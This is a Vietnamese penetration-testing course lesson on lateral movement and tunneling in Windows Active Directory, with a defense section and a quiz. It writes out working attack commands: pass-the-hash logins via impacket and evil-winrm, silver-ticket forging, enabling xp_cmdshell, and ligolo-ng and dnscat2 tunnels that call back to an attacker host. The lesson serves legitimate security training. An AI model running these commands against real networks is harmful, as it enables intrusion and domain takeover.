@@ -1,0 +1,290 @@
+---
+title: "Di chuyển ngang và tunneling nâng cao trong Windows/AD"
+code: "3.9"
+level: 3
+summary: "Sau khi có một bộ thông tin đăng nhập trên một máy, câu hỏi tiếp theo là: làm sao từ đó lan ra cả mạng, và vì sao hệ thống vé Kerberos — tưởng chừng an toàn hơn mật khẩu — lại trở thành con đường để kẻ tấn công giữ quyền kiểm soát cả domain lâu dài."
+duration: "90 phút"
+updated: "2026-11-12"
+prereq: ["3.3", "3.5"]
+objectives:
+  - "Tự đăng nhập sang một máy Windows khác bằng WinRM, PsExec hoặc WMI, dùng được cả mật khẩu và hash"
+  - "Phân biệt overpass-the-hash, pass-the-ticket, silver ticket và golden ticket: mỗi kỹ thuật lạm dụng vé Kerberos theo cách nào"
+  - "Biết khi nào cần tunneling nâng cao hơn proxychains — ligolo-ng, DNS tunnel — để len vào vùng mạng sâu hơn"
+  - "Nắm được cách một SOC phát hiện và chặn di chuyển ngang trong thực tế"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Lenh from '../../components/ui/Lenh.astro';
+import LabBrief from '../../components/ui/LabBrief.astro';
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Vào được một phòng trong toà nhà mới chỉ là bước đầu. Kẻ đột nhập thật sự nguy hiểm là người biết dùng chìa khoá nhặt được ở phòng này để mở phòng kế bên, rồi phòng kế bên nữa, cho tới khi chạm được phòng giám đốc — nơi giữ chìa khoá tổng của cả toà nhà.
+
+**Di chuyển ngang** (lateral movement) chính là chuỗi hành động đó trong mạng máy tính: dùng thông tin lấy được ở một máy — một mật khẩu, một hash, một vé đăng nhập còn sót lại trong bộ nhớ — để bước sang máy kế tiếp, cho tới khi chạm được máy giữ quyền cao nhất của cả domain.
+
+Bài này nối tiếp bài 3.3 (pivoting — mở đường mạng tới vùng bị chặn) và bài 3.5 (những điểm yếu khiến Active Directory lộ thông tin đăng nhập): bạn đã có một bộ thông tin đăng nhập hoặc một hash trong tay, giờ là lúc dùng nó để lan rộng.
+
+Và vì Windows xác thực nội bộ bằng Kerberos — hệ thống "vé" thay cho gửi mật khẩu đi khắp nơi (bài 3.4) — chính cơ chế vé đó, nếu bị lạm dụng đúng cách, lại trở thành con đường ngắn nhất để không chỉ đi ngang một máy mà nắm luôn cả domain.
+
+## Kiến thức chính
+
+### Di chuyển ngang bằng thông tin đăng nhập
+
+Khi có tên người dùng và mật khẩu (hoặc hash, bài 3.5), bạn có thể đăng nhập sang máy khác bằng các dịch vụ quản trị từ xa của Windows. Ba đường kinh điển:
+
+- **WinRM** (cổng 5985/5986): quản trị từ xa bằng PowerShell. Công cụ `evil-winrm` cho một phiên đẹp, có sẵn truyền file.
+- **PsExec** (qua SMB, cổng 445): chạy lệnh từ xa với quyền SYSTEM; bản impacket dùng được bằng cả mật khẩu lẫn hash.
+- **WMI** (Windows Management Instrumentation, cơ chế quản lý có sẵn của Windows): chạy lệnh từ xa, kín đáo hơn PsExec vì ít để lại dấu vết (không tạo dịch vụ mới).
+
+<Lenh noi="Terminal trên máy Kali, đã có thông tin đăng nhập hoặc hash của một tài khoản trên máy mục tiêu" muc="So sánh ba cách đăng nhập từ xa vào một máy Windows khác, dùng được cả mật khẩu và hash">
+
+<Terminal title="Ba cách sang một máy Windows bằng impacket / evil-winrm">
+
+```text
+kali@lab:~$ evil-winrm -i 10.10.14.60 -u jdoe -p 'Summer2024!'
+    WinRM với mật khẩu — cho một phiên PowerShell đẹp.
+kali@lab:~$ impacket-psexec -hashes :aad3b...31d6 megacorp.lab/administrator@10.10.14.60
+    PsExec bằng hash (Pass-the-Hash, bài 3.5) — không cần mật khẩu gốc.
+kali@lab:~$ impacket-wmiexec megacorp.lab/jdoe:'Summer2024!'@10.10.14.60
+    WMI — chạy lệnh từ xa, kín đáo hơn PsExec.
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `evil-winrm -i 10.10.14.60 -u jdoe -p 'Summer2024!'`: `-i` là địa chỉ máy đích, `-u`/`-p` là tài khoản và mật khẩu. Mở một phiên PowerShell đầy đủ qua WinRM (cổng 5985).
+- `impacket-psexec -hashes :aad3b...31d6 megacorp.lab/administrator@10.10.14.60`: giống PsExec gốc của Windows nhưng chạy từ Kali; `-hashes :...` dùng thẳng chuỗi hash NTLM thay cho mật khẩu (Pass-the-Hash, bài 3.5).
+- `impacket-wmiexec megacorp.lab/jdoe:'Summer2024!'@10.10.14.60`: dùng giao thức WMI để chạy lệnh, không cần cờ riêng cho mật khẩu — viết liền trong chuỗi `tài-khoản:'mật-khẩu'`.
+- Ba dòng chữ thường bắt đầu bằng khoảng trắng là chú thích của bài giải thích từng lệnh, không phải output thật.
+
+</div>
+
+<div slot="doc">
+
+- `evil-winrm` thành công sẽ đổi dấu nhắc thành `*Evil-WinRM* PS C:\...>`, một phiên PowerShell dùng ngay được.
+- `impacket-psexec` và `impacket-wmiexec` khi thành công sẽ mở một dấu nhắc `C:\...>` kiểu cmd, chạy lệnh trực tiếp.
+- Báo `STATUS_LOGON_FAILURE` hoặc `STATUS_ACCESS_DENIED`: sai thông tin đăng nhập, hoặc tài khoản không có quyền đăng nhập từ xa trên máy đích (kiểm tra tài khoản có trong nhóm quản trị hoặc nhóm WinRM phù hợp không).
+
+</div>
+
+</Lenh>
+
+<Callout type="note" label="Đường thứ tư: DCOM, và cách chọn giữa bốn đường">
+<strong>DCOM</strong> (cổng 135 cùng một cổng động) cho phép gọi từ xa các đối tượng có sẵn của Windows, ví dụ <code>MMC20.Application</code>, có hàm chạy lệnh. Từ Kali: <code>impacket-dcomexec megacorp.lab/jdoe:'Summer2024!'@10.10.14.60</code>. Giống WMI, nó không tạo dịch vụ mới nên ít để lại dấu hơn PsExec; dùng khi SMB (445) và WinRM (5985) bị chặn nhưng 135 còn mở.<br />
+Cách chọn nhanh: nhìn cổng mở trên máy đích. <strong>5985</strong> mở và tài khoản thuộc nhóm Remote Management Users thì <code>evil-winrm</code>; <strong>445</strong> mở và bạn là quản trị viên cục bộ thì <code>psexec</code> (được luôn SYSTEM) hoặc <code>wmiexec</code>; chỉ có <strong>135</strong> thì <code>wmiexec</code>/<code>dcomexec</code>; <strong>3389</strong> thì RDP (<code>xfreerdp /v:10.10.14.60 /u:jdoe /p:'Summer2024!'</code>). Trước khi thử từng cái, cho NetExec quét một lượt để biết tài khoản dùng được ở đâu: <code>nxc smb 10.10.14.0/24 -u jdoe -p 'Summer2024!'</code>; dòng có chữ <code>(Pwn3d!)</code> là máy bạn có quyền quản trị.
+</Callout>
+
+### Lạm dụng vé Kerberos
+
+Nhớ ở bài 3.4: Kerberos xác thực bằng các "vé" thay cho việc gửi mật khẩu khắp nơi. Chính cơ chế vé này bị lạm dụng theo nhiều cách, tất cả đều cần đã có một chỗ đứng và quyền phù hợp:
+
+- **Overpass-the-hash (pass-the-key):** dùng hash NTLM để xin một vé Kerberos (TGT) hợp lệ, rồi dùng vé đó. Biến một hash thành một phiên Kerberos đầy đủ.
+- **Pass-the-ticket:** đánh cắp một vé đang nằm trong bộ nhớ một máy đã chiếm, rồi nạp (inject) vé đó vào phiên của mình để mạo danh người dùng gốc, khỏi cần mật khẩu.
+- **Silver ticket (vé bạc):** với hash của một tài khoản dịch vụ, tự làm giả vé dịch vụ (TGS) cho đúng dịch vụ đó. Phạm vi hẹp (một dịch vụ) nhưng rất kín.
+- **Golden ticket (vé vàng):** nước đi tối hậu. Với hash của tài khoản đặc biệt `krbtgt` (lấy được sau khi đã chiếm domain, ví dụ qua DCSync ở bài 3.5), kẻ tấn công **tự làm giả vé TGT cho bất kỳ ai, hiệu lực rất lâu**. Đây là cách duy trì quyền kiểm soát domain kể cả sau khi đổi mật khẩu người dùng.
+
+<ConceptMap
+  client:visible
+  title="Từ một hash tới kiểm soát toàn domain"
+  width={660}
+  height={300}
+  nodes={[
+    { id: 'hash', label: 'Có một hash / mật khẩu', x: 110, y: 150, w: 185, tone: 'warn', detail: 'Điểm khởi đầu: lấy được từ một máy đã chiếm (bài 2.6, 3.5).' },
+    { id: 'lat', label: 'Di chuyển ngang', sub: 'WinRM / PsExec / WMI', x: 320, y: 70, w: 180, detail: 'Dùng thông tin đó sang máy khác. Mỗi máy mới có thể chứa vé hoặc hash của người dùng cao hơn.' },
+    { id: 'ticket', label: 'Lạm dụng vé', sub: 'overpass / pass-the-ticket', x: 320, y: 220, w: 180, detail: 'Biến hash thành vé Kerberos, hoặc đánh cắp vé trong bộ nhớ để mạo danh người dùng khác.' },
+    { id: 'dc', label: 'Chiếm domain', sub: 'DCSync → krbtgt', x: 540, y: 150, w: 150, tone: 'accent', detail: 'Lấy hash krbtgt cho phép làm golden ticket: giả vé cho bất kỳ ai, duy trì quyền kiểm soát lâu dài. Bài 3.5.' },
+  ]}
+  edges={[
+    { from: 'hash', to: 'lat' },
+    { from: 'hash', to: 'ticket' },
+    { from: 'lat', to: 'dc' },
+    { from: 'ticket', to: 'dc' },
+  ]}
+/>
+
+<Callout type="warn">
+Tất cả trên đây chỉ thực hành trên domain lab của bạn hoặc nơi được phép bằng văn bản. Golden ticket đặc biệt nhạy cảm vì nó là kỹ thuật duy trì quyền kiểm soát; ở đây trình bày để bạn hiểu vì sao <strong>phải đổi mật khẩu krbtgt hai lần</strong> khi dọn một domain đã bị xâm nhập.
+</Callout>
+
+<Callout type="note" label="Silver ticket cần gì, so với golden ticket">
+Điểm khác cốt lõi là <strong>đúc bằng chìa nào</strong>. Golden ticket cần hash của <code>krbtgt</code> (chìa tổng của cả domain) nên làm giả được vé TGT cho <em>bất kỳ ai, tới bất kỳ dịch vụ nào</em>. Silver ticket chỉ cần hash của <em>một tài khoản dịch vụ</em> (lấy được từ Kerberoasting, bài 3.5) và vì thế chỉ giả được vé tới đúng <em>một dịch vụ</em> đó — ví dụ chỉ CIFS của một file server. Phạm vi hẹp hơn nhưng kín hơn, vì vé tự đúc không hề đi qua DC nên DC không ghi được gì.
+</Callout>
+
+Trong lab, silver ticket hay xuất hiện ở đúng một tình huống: bạn bẻ được mật khẩu tài khoản dịch vụ SQL (`svc_sql`) qua Kerberoasting, đăng nhập được vào SQL Server nhưng chỉ với quyền thấp. Vì SQL Server tin mọi vé được mã hoá bằng khoá của `svc_sql`, bạn tự đúc một vé nói rằng mình là Administrator:
+
+<Lenh noi="Terminal trên máy Kali, đã có mật khẩu của tài khoản dịch vụ svc_sql" muc="Tự đúc một vé dịch vụ mang danh Administrator cho đúng dịch vụ MSSQL, rồi dùng vé đó để đăng nhập" quyen="Cần hash NT của tài khoản dịch vụ, SID của domain và SPN của dịch vụ">
+
+<Terminal title="Silver ticket bằng impacket">
+
+```text
+kali@lab:~$ impacket-lookupsid megacorp.lab/jdoe:'Summer2024!'@10.10.14.50 | grep "Domain SID"
+[*] Domain SID is: S-1-5-21-1987370270-658905905-1781884369
+
+kali@lab:~$ impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c \
+            -domain-sid S-1-5-21-1987370270-658905905-1781884369 \
+            -domain megacorp.lab -spn MSSQLSvc/sql01.megacorp.lab:1433 Administrator
+[*] Saving ticket in Administrator.ccache
+
+kali@lab:~$ export KRB5CCNAME=Administrator.ccache
+kali@lab:~$ impacket-mssqlclient -k -no-pass sql01.megacorp.lab
+SQL (MEGACORP\Administrator  dbo@master)> enable_xp_cmdshell
+SQL (MEGACORP\Administrator  dbo@master)> xp_cmdshell whoami
+megacorp\svc_sql
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `impacket-lookupsid`: hỏi DC để lấy SID của domain, một chuỗi định danh mà mọi vé phải mang.
+- `impacket-ticketer -nthash ... -spn ... Administrator`: đúc vé. `-nthash` là hash NT của `svc_sql` (đổi từ mật khẩu đã bẻ, bằng `iconv -t utf16le | openssl md4` hoặc một trang tính hash NTLM ngoại tuyến); `-spn` là dịch vụ đích, đúng như Kerberoasting đã in ra; tên cuối là người bạn muốn mạo danh.
+- `export KRB5CCNAME=...`: chỉ cho các công cụ impacket biết file vé cần dùng. `-k -no-pass` bảo `mssqlclient` xác thực bằng vé thay vì mật khẩu.
+
+</div>
+
+<div slot="doc">
+
+- Dấu nhắc `dbo@master` cho thấy SQL Server coi bạn là quản trị viên của nó, nên bật được `xp_cmdshell`.
+- `xp_cmdshell whoami` trả về `svc_sql` chứ không phải Administrator: lệnh hệ điều hành chạy bằng tài khoản mà dịch vụ SQL đang dùng. Tài khoản đó thường có SeImpersonate, tức là đi tiếp bằng họ Potato (bài 3.2).
+- Kerberos cần **tên máy** chứ không phải IP, và đồng hồ lệch quá 5 phút là hỏng: thêm `sql01.megacorp.lab` vào `/etc/hosts` và đồng bộ giờ với DC (`sudo ntpdate 10.10.14.50`) trước khi thử.
+
+</div>
+
+</Lenh>
+
+### Tunneling nâng cao
+
+Bài 3.3 đã có SSH tunnel, proxychains và chisel. Hai công cụ hiện đại thường gặp thêm:
+
+- **ligolo-ng:** dựng một giao diện mạng ảo trên máy tấn công, khiến cả mạng nội bộ sau máy bàn đạp "hiện ra" như thể bạn đang ở trong đó. Mượt hơn proxychains cho nhiều công cụ.
+- **DNS tunneling:** khi mọi cổng ra đều bị chặn nhưng DNS vẫn đi được (thường vậy), dữ liệu được giấu trong các truy vấn DNS để lọt ra. Chậm nhưng vượt được mạng bị khoá chặt. Chính vì thế lưu lượng DNS bất thường là một tín hiệu phát hiện quan trọng.
+
+Ý tưởng ligolo-ng: máy tấn công dựng một "người nghe" và một **giao diện mạng ảo** trỏ tới mạng nội bộ sau máy bàn đạp. Sau đó các công cụ (nmap, evil-winrm...) chạy thẳng tới dải `10.10.20.0/24` như thể bạn đang ngồi trong mạng đó, không cần proxychains đứng trước mỗi lệnh.
+
+<Lenh noi="Hai nơi: terminal trên Kali (proxy) và shell trên máy bàn đạp (agent)" muc="Dựng một giao diện mạng ảo trên Kali rồi định tuyến cả dải mạng nội bộ 172.16.0.0/24 qua máy bàn đạp" quyen="Cần sudo trên Kali để tạo giao diện mạng; trên máy bàn đạp chỉ cần quyền người dùng thường">
+
+<Terminal title="Dựng tunnel ligolo-ng">
+
+```text
+kali@lab:~$ sudo ip tuntap add user kali mode tun ligolo
+kali@lab:~$ sudo ip link set ligolo up
+kali@lab:~$ ./proxy -selfcert
+INFO[0000] Listening on 0.0.0.0:11601
+
+    (trên máy bàn đạp, Windows hoặc Linux)
+C:\Windows\Temp> agent.exe -connect 10.10.14.7:11601 -ignore-cert
+
+    (quay lại cửa sổ proxy trên Kali)
+INFO[0042] Agent joined. name=MEGACORP\jdoe@WEB01
+ligolo-ng » session
+? Specify a session : 1 - MEGACORP\jdoe@WEB01
+[Agent : MEGACORP\jdoe@WEB01] » ifconfig
+    Interface 1: 172.16.0.5/24
+[Agent : MEGACORP\jdoe@WEB01] » start
+INFO[0061] Starting tunnel to MEGACORP\jdoe@WEB01
+
+    (một terminal khác trên Kali)
+kali@lab:~$ sudo ip route add 172.16.0.0/24 dev ligolo
+kali@lab:~$ nxc smb 172.16.0.0/24
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `ip tuntap add ... mode tun ligolo` và `ip link set ligolo up`: tạo và bật một card mạng ảo tên `ligolo` trên Kali. Làm một lần cho mỗi lần khởi động máy.
+- `./proxy -selfcert`: chạy phần máy chủ của ligolo-ng, tự sinh chứng chỉ, chờ ở cổng 11601.
+- `agent.exe -connect 10.10.14.7:11601 -ignore-cert`: phần chạy trên máy bàn đạp, gọi **ra** Kali (nên qua được tường lửa chặn chiều vào).
+- `session`, `ifconfig`, `start`: chọn agent, xem nó đang ở những mạng nào, rồi mở tunnel.
+- `ip route add 172.16.0.0/24 dev ligolo`: bảo Kali gửi mọi gói tới dải nội bộ vào card ảo, tức là qua tunnel.
+
+</div>
+
+<div slot="doc">
+
+- Dòng `Interface 1: 172.16.0.5/24` cho biết máy bàn đạp có chân trong dải nào; đó chính là dải bạn thêm vào bảng định tuyến.
+- Từ đây mọi công cụ chạy bình thường, không cần `proxychains`. `nmap` qua ligolo phải dùng quét kết nối đầy đủ (`-sT`) hoặc chạy không cần `sudo`, và nên thêm `-Pn`.
+- Cần nhận reverse shell **từ** một máy nội bộ về Kali: mở một cổng nghe trên agent chuyển tiếp về Kali bằng `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444`, rồi cho payload gọi về IP nội bộ của máy bàn đạp, cổng 4444.
+- Có lớp mạng thứ hai: chạy thêm một agent trên máy ở lớp trong, cho nó gọi về qua một `listener_add` trỏ tới cổng 11601.
+
+</div>
+
+</Lenh>
+
+<Callout type="note" label="DNS tunnel bằng dnscat2: trông ra sao">
+Trên Kali chạy máy chủ: <code>dnscat2-server tunnel.lab</code>. Trên máy nạn nhân chạy client trỏ vào máy chủ DNS mà bạn kiểm soát: <code>dnscat2 --dns server=10.10.14.7,port=53 --secret=...</code> (hoặc chỉ ghi tên miền, để truy vấn tự đi qua máy chủ DNS nội bộ của nạn nhân). Khi phiên hiện lên ở máy chủ, <code>window -i 1</code> vào phiên, <code>shell</code> mở một shell, còn <code>listen 127.0.0.1:4455 172.16.0.10:445</code> chuyển tiếp một cổng qua DNS giống <code>ssh -L</code>. Tốc độ rất chậm và lưu lượng rất lạ (hàng nghìn truy vấn TXT/CNAME tới cùng một tên miền), nên chỉ dùng khi mọi cổng khác đều bị chặn.
+</Callout>
+
+<LabBrief
+  ten="Lấy hash từ máy trạm, rồi sang Domain Controller bằng chính hash đó"
+  muctieu="Trên lab AD tự dựng ở bài 3.4, lấy hash NTLM của một tài khoản trên máy trạm, rồi dùng Pass-the-Hash để đăng nhập sang Domain Controller mà không cần biết mật khẩu"
+  may="Lab AD tự dựng ở bài 3.4 (Domain Controller + máy trạm)"
+  thoigian="35 phút"
+  xong="Lệnh whoami chạy trên Domain Controller qua phiên bạn vừa mở trả về đúng tài khoản đã dùng hash, mà bạn chưa từng gõ mật khẩu của tài khoản đó"
+>
+
+1. Trên máy trạm, đăng nhập bằng một tài khoản domain có quyền quản trị cục bộ trên máy trạm đó (không cần là Domain Admin).
+2. Lấy quyền quản trị cục bộ trên máy trạm (đã làm được ở bài 3.2), rồi rút hash NTLM của tài khoản vừa đăng nhập.
+3. Từ Kali, dùng hash đó để đăng nhập sang Domain Controller qua một trong các công cụ ở phần "Di chuyển ngang bằng thông tin đăng nhập".
+4. Nếu bước 3 bị từ chối (vì tài khoản không có quyền trên DC), thử lại với tài khoản Administrator cục bộ thay vì tài khoản domain thường.
+
+<div slot="goiy1">
+Cách rút hash NTLM từ một máy đã có quyền quản trị đã học ở bài 3.2 (SAM) và bài 3.5 (`sekurlsa::logonpasswords` qua mimikatz).
+</div>
+
+<div slot="goiy2">
+Ba lệnh `evil-winrm -H`, `impacket-psexec -hashes`, `impacket-wmiexec` ở đầu bài này đều nhận thẳng hash thay cho mật khẩu — chọn một cái và đổi hash/IP cho khớp lab bạn.
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: `whoami` trả về đúng tên tài khoản domain (hoặc Administrator cục bộ) mà bạn đã dùng hash, không hỏi mật khẩu ở bước đăng nhập.
+- Báo `STATUS_LOGON_FAILURE`: hash sai định dạng — kiểm tra bạn đang dùng hash NT (phần sau dấu `:` cuối), không phải hash LM (phần trước).
+- Báo `STATUS_ACCESS_DENIED`: hash đúng nhưng tài khoản không có quyền đăng nhập từ xa trên DC — đổi sang Administrator cục bộ hoặc một tài khoản thuộc nhóm Domain Admins.
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Giờ hãy đổi sang góc nhìn của người bảo vệ mạng doanh nghiệp: mọi kỹ thuật di chuyển ngang ở trên đều để lại dấu vết rất rõ nếu bạn chặn đúng chỗ và biết nhìn đúng log.
+
+Lớp phòng thủ mạnh nhất trước Pass-the-Hash và Pass-the-Ticket là <strong>phân tầng tài khoản quản trị (administrative tiering)</strong>: tuyệt đối không dùng tài khoản Domain Admin để đăng nhập vào máy trạm nhân viên hay máy chủ thông thường, vì làm vậy chẳng khác nào mang chiếc chìa khóa tổng đặt sẵn vào căn phòng dễ bị cạy cửa nhất. Kết hợp thêm <strong>Credential Guard</strong> trên Windows để cách ly vé và hash trong bộ nhớ, bạn sẽ làm nản lòng các công cụ rút thông tin xác thực.
+
+Ở tầng mạng, hãy <strong>phân đoạn mạng</strong> (bài 3.3) và chặn các cổng quản trị như SMB (445) hay WinRM (5985) giữa các máy trạm ngang hàng với nhau, vì máy của nhân viên kế toán không có lý do gì phải mở phiên quản trị sang máy nhân sự. Về phía giám sát tại SOC, hãy theo dõi các sự kiện đăng nhập mạng bất thường (Event ID 4624 kiểu 3, 4648 — bài 8.1) khi một tài khoản đột ngột nhảy qua hàng loạt máy trong vài phút, đồng thời giám sát các truy vấn DNS dài bất thường tới miền lạ để bắt DNS tunneling.
+
+Và một quy tắc sống còn khi ứng cứu sự cố: nếu kẻ tấn công đã chạm được tới quyền Domain Admin, khi dọn dẹp bắt buộc phải <strong>đổi mật khẩu tài khoản `krbtgt` hai lần liên tiếp</strong> thì mới hủy được hiệu lực của mọi chiếc Golden Ticket mà chúng đã kịp đúc.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Có được hash NTLM trong tay rồi vẫn tốn hàng giờ cố bẻ khóa về mật khẩu chữ rõ.** Với hầu hết các công cụ như `evil-winrm`, `impacket-psexec` hay `impacket-wmiexec`, bạn có thể truyền thẳng chuỗi hash qua cơ chế Pass-the-Hash hoặc Overpass-the-Hash để đăng nhập ngay lập tức, tiết kiệm thời gian quý giá trong phòng thi.
+- **Dùng `psexec` một cách máy móc ở mọi nơi mà quên mất độ ồn của nó.** `psexec` tải một file thực thi lên thư mục chia sẻ và tạo một dịch vụ hệ thống mới (sinh Event ID 7045 rất rõ trên SIEM); trong môi trường có giám sát hoặc khi `psexec` bị AV chặn, `wmiexec` hoặc `evil-winrm` thường gọn nhẹ và ít gây chú ý hơn nhiều.
+- **Nhầm tưởng Golden Ticket là kỹ thuật dùng để leo thang đặc quyền ban đầu.** Muốn đúc được Golden Ticket, bạn bắt buộc phải có hash của tài khoản `krbtgt` — nghĩa là bạn đã phải chiếm được Domain Controller trước đó rồi; đây là kỹ thuật duy trì quyền kiểm soát lâu dài (persistence), không phải chìa khóa mở cửa lúc mới vào.
+- **Cố ép mọi công cụ phức tạp chạy qua `proxychains` rồi bế tắc vì lỗi kết nối.** Khi cần di chuyển ngang sâu qua nhiều lớp mạng và dùng các công cụ kén proxy, dựng một giao diện mạng ảo bằng `ligolo-ng` sẽ giúp mọi lệnh chạy mượt và tự nhiên như thể máy Kali đang cắm dây trực tiếp vào mạng nội bộ.
+- **Ở góc độ quản trị: dùng luôn tài khoản Domain Admin để vào máy trạm sửa lỗi cho nhân viên.** Thói quen "tiện tay" này để lại vé TGT và hash của quyền cao nhất nằm nguyên trong bộ nhớ máy trạm, biến một máy tính văn phòng bình thường thành bàn đạp trực tiếp mất trắng cả domain.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'evil-winrm dùng để làm gì?', options: ['Quét cổng', 'Lấy một phiên quản trị từ xa qua WinRM bằng thông tin đăng nhập hoặc hash', 'Bẻ mật khẩu'], answer: 1, explain: 'WinRM (5985/5986) là một đường di chuyển ngang phổ biến; evil-winrm cho phiên đẹp kèm truyền file.' },
+    { q: 'Golden ticket cần thứ gì và cho kẻ tấn công điều gì?', options: ['Mật khẩu một người dùng thường; quyền đọc một file', 'Hash tài khoản krbtgt; khả năng tự làm giả vé cho bất kỳ ai, duy trì kiểm soát domain lâu dài', 'Một web shell; quyền tạm thời'], answer: 1, explain: 'Có hash krbtgt (sau khi đã chiếm domain), kẻ tấn công giả vé TGT cho mọi tài khoản. Vì vậy phải đổi mật khẩu krbtgt hai lần khi dọn.' },
+    { q: 'Pass-the-ticket khác overpass-the-hash ở đâu?', options: ['Giống hệt nhau', 'Pass-the-ticket đánh cắp vé có sẵn trong bộ nhớ để mạo danh; overpass-the-hash dùng hash để xin một vé mới', 'Pass-the-ticket chỉ chạy trên Linux'], answer: 1, explain: 'Một bên tái dùng vé đã tồn tại, một bên biến hash thành vé Kerberos mới.' },
+    { q: 'Biện pháp phòng thủ nào mạnh nhất chống pass-the-hash và pass-the-ticket?', options: ['Đổi mật khẩu wifi', 'Phân tầng tài khoản: tài khoản quản trị domain không đăng nhập máy trạm thường', 'Tắt DNS'], answer: 1, explain: 'Nếu hash/vé quyền cao không bao giờ rơi vào máy dễ bị chiếm thì không có gì để đánh cắp.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Khi đã có thông tin đăng nhập hoặc hash NTLM, bạn có thể di chuyển ngang sang các máy Windows khác qua WinRM (`evil-winrm`), SMB (`impacket-psexec`) hoặc WMI (`impacket-wmiexec`) mà không nhất thiết phải biết mật khẩu chữ rõ.
+- Cơ chế vé Kerberos có thể bị lạm dụng ở nhiều mức: biến hash thành vé TGT hợp lệ (Overpass-the-Hash), lấy cắp vé có sẵn trong bộ nhớ (Pass-the-Ticket), làm giả vé cho một dịch vụ riêng lẻ (Silver Ticket), hoặc dùng hash `krbtgt` để đúc vé toàn năng cho cả miền (Golden Ticket).
+- Khi cần đi xuyên qua nhiều lớp mạng, `ligolo-ng` tạo giao diện mạng ảo giúp các công cụ chạy mượt hơn hẳn `proxychains`, còn DNS tunneling là phương án cuối khi mọi cổng ra bị khóa chặt nhưng luôn để lại dấu vết truy vấn DNS bất thường.
+- Phòng thủ hiệu quả nhất trước di chuyển ngang là phân tầng tài khoản quản trị (không để Domain Admin đăng nhập máy thường), chặn cổng quản trị giữa các máy trạm, giám sát log đăng nhập mạng và đổi mật khẩu `krbtgt` hai lần khi dọn dẹp sự cố.
